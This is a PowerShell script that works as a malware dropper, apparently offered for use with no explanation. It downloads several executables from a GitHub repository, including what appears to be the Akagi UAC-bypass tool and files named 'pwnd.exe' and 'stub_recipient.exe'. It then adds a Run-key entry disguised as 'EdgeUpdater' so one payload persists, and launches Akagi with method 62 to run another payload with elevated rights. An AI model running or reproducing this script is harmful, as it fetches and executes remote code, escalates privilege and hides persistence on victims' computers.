Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "$env:USERPROFILE\Documents\Akagi.exe"

Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/pwnd.exe" -OutFile "$env:USERPROFILE\Documents\demo.exe"

Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/Akagi64.exe" -OutFile "C:\Users\Public\Akagi.exe"

Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/stub_recipient.exe" -OutFile "C:\Users\Public\demo.exe"

Invoke-WebRequest -Uri "https://github.com/Brothersextremegaming/pwshcradle/raw/refs/heads/main/p.exe" -OutFile "C:\Users\Public\p.exe"

$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$AppName = "EdgeUpdater"
$ExePath = "C:\Users\Public\p.exe"

If (-not (Test-Path $RegPath)) { New-Item -Path $RegPath -Force | Out-Null }
New-ItemProperty -Path $RegPath -Name $AppName -Value "`"$ExePath`"" -PropertyType String -Force | Out-Null


$env:USERPROFILE\Documents\Akagi.exe 62 $env:USERPROFILE\Documents\demo.exe

